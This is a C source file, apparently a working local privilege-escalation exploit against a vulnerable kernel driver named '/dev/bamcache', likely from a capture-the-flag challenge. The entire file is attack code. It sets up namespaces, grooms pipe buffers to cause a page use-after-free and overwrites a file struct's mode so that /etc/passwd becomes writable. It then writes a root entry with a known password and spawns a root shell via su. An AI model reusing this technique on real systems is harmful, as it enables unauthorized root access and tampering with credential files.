#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>


#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");

#define ALLOC 0xcafe01
#define DELETE 0xcafe02
#define EDIT 0xcafe03

typedef struct
{
    int64_t idx;
    uint64_t size;
    char *buf;    
}user_req_t;

int dev_fd;

int open_device()
{
    int fd = open("/dev/bamcache", O_RDWR);
    if(fd==-1){
        perror("[-] open(/dev/bamcache)");
        return EXIT_FAILURE;
    }

    puts("[+] Device opened");

    return fd;
}

int bam_add(uint64_t idx)
{
    user_req_t req = {
        .idx = idx,
    };

    int ret = ioctl(dev_fd, ALLOC, &req);
    if(ret==-1){
        perror("[-] bamcache: add failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int bam_edit(uint64_t idx, uint64_t size, char *buff)
{
    user_req_t req = {
        .idx = idx,
        .size = size,
        .buf = buff
    };

    int ret = ioctl(dev_fd, EDIT, &req);
    if(ret==-1){
        perror("[-] bamcache: edit failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int bam_del(uint64_t idx)
{
    user_req_t req = {
        .idx = idx,
    };

    int ret = ioctl(dev_fd, DELETE, &req);
    if(ret==-1){
        perror("[-] bamcache: delete failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

#define SKB_SHARED_INFO_SIZE 0x140
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))
#define MSG_NUM 0x100

#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 128
#define FILE_NUM 0x100

int pipe_fd[PIPE_NUM][2];
int file_fd[FILE_NUM];
size_t find_pipe[PIPE_NUM][2];
int same_pipe[2];

static void adjust_rlimit() {
    struct rlimit rlim;
    rlim.rlim_cur = rlim.rlim_max = (200 << 20);
    setrlimit(RLIMIT_AS, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 32 << 20;
    setrlimit(RLIMIT_MEMLOCK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 136 << 20;
    // setrlimit(RLIMIT_FSIZE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 1 << 20;
    setrlimit(RLIMIT_STACK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
    // RLIMIT_FILE
  
      rlim.rlim_cur = rlim.rlim_max = 4096;
      if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
        perror("[-] setrlimit");
      }
    
  }

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;
  
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
 
    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);
  
    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
  
    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}  


void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

int main(int argc, char **argv, char **envp)
{
    cpu_set_t cpu_set;

    puts("\033[32m\033[1m[+] bamcache no leak page-uaf.\033[0m");

    // ident namespace
    unshare_setup();

    // run the exp on specific core only
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    adjust_rlimit();
    long page_size = sysconf(_SC_PAGE_SIZE);

    size_t pipe_magic;
    for(int i=0;i<PIPE_NUM;i++)
    {
        if(pipe(pipe_fd[i])<0)
        {
            errExit("PIPE_ERROR.");
        }
    }

    for(int i=0;i<PIPE_NUM;i++)
    {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] failed to extend %d pipe!\n",i);
            return -1;
        }
    }

    puts("[*] allocating pipe pages...");
    for (int i = 0; i < PIPE_NUM; i++) {
        size_t magic_num = 0xdead0000+i;
        write(pipe_fd[i][1], &magic_num, 8);
        write(pipe_fd[i][1], "bambamx7", 8);
        // write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], "bambamx7", 8);
        write(pipe_fd[i][1], "bambamx7", 8);  /* prevent pipe_release() */
    }
    // getchar();

    puts("[*] Create 4 holes in pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i += (128/4))
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
    
    puts("[*] Trigger oob");

    char bam_buff[0x1000];

    dev_fd = open_device();
    for(int i = 1; i < 10; i++){
        bam_add(i);
    }

    for(int i = 1; i < 10; i++){
        bam_edit(i, 0x1000, bam_buff);
    }

    for (int i = 0; i < PIPE_NUM; i++)
    {
        if(i%(PIPE_NUM/4)!=0)//can't equal to the hole
        {
            read(pipe_fd[i][0],find_pipe[i],0x10);
        }
        
    }

    size_t victim_id = 0;
    size_t prev_id = 0;
    size_t magic = 0;
    char *tmp_content = malloc(0x1000);
    size_t buf[0x1000];
    int SND_PIPE_BUF_SZ = 96*2;
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/0x28);

    int is_found = 0;
    // puts("[*]finding...");
    for (int i = 0; i < PIPE_NUM&&!is_found; i++)
    {
        if(i%(128/4)!=0)//can't equal to the hole
        {
            if(find_pipe[i][0]!=0xdead0000+i&&!strncmp(&find_pipe[i][1],"bambamx7",8))
            {
                same_pipe[0]=find_pipe[i][0]-0xdead0000;
                same_pipe[1]=i;//previous
                // if(same_pipe[0]>PIPE_NUM||same_pipe[0]-same_pipe[1]==1||same_pipe[1]-same_pipe[0]==1)
                if(same_pipe[0]>PIPE_NUM)
                {
                    RED puts("[*]pipe idx out of range."); CLOSE
                    return -1;
                }
                BLUE printf("found pipe coincide at idx:%d and %d\n",same_pipe[0],same_pipe[1]); CLOSE
                is_found=1;
            }   
        }
        
    }
    if(!is_found)
    {
        perror("[*] Not found two pipe.");
        for(int i = 1; i < 10; i++){
            bam_del(i);
        }
        close(dev_fd);
        return -1;
    }

    memset(buf, '\0', sizeof(buf));

    /*write something to alarge the pipe_read size after*/
    // write(pipe_fd[same_pipe[1]][1], buf,0x500);
    write(pipe_fd[same_pipe[1]][1], buf, SND_PIPE_BUF_SZ*2 - 24 - 3*sizeof(int)+0x18+0x28+0x84);


    puts("[*]uaf one of the pipe_buffer");
    // getchar();
    close(pipe_fd[same_pipe[0]][0]);
    close(pipe_fd[same_pipe[0]][1]);

    // puts("[*]press enter to put the pwd file page cache into the uaf page");
    puts("[*] Spray pwd file struct...");
    
    for (int i = 0; i < FILE_NUM; i++) 
    {

        file_fd[i] = open("/etc/passwd",0);
        if (file_fd[i] < 0) 
        {
            perror("FAILED to open pwd file!");
            for(int i = 1; i < 10; i++){
                bam_del(i);
            }
            close(dev_fd);
            return -1;
        }
    }

    // getchar();
    int tmp[2];
    tmp[0] = 0x480e801f;
    puts("[*] Edit pwd file->f_mode...");
    write(pipe_fd[same_pipe[1]][1], tmp, 4);

    char *data = "root:$1$evil$B1cg.QF41pkr9LUa9L0vm1:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt evil evil
    printf("Setting root password to \"evil\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd file");
    //what we want to edit pipe->page
    for (int i = 0;i < FILE_NUM; i++) {
        int retval = write(file_fd[i], data,data_size);
            if (retval > 0)
            {
               RED printf("Write Success:%d!\n",i); CLOSE
            }

    }

    for (int i = 0;i < FILE_NUM; i++) 
        {   
            close(file_fd[i]);
        }    
    puts("[*]Now the pwd is:"); CLOSE
    system("cat /etc/passwd");
    char *cmd[] = {"/bin/sh", "-c", "(echo evil; cat) | su - -c \""
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};

    execv("/bin/sh", cmd);
}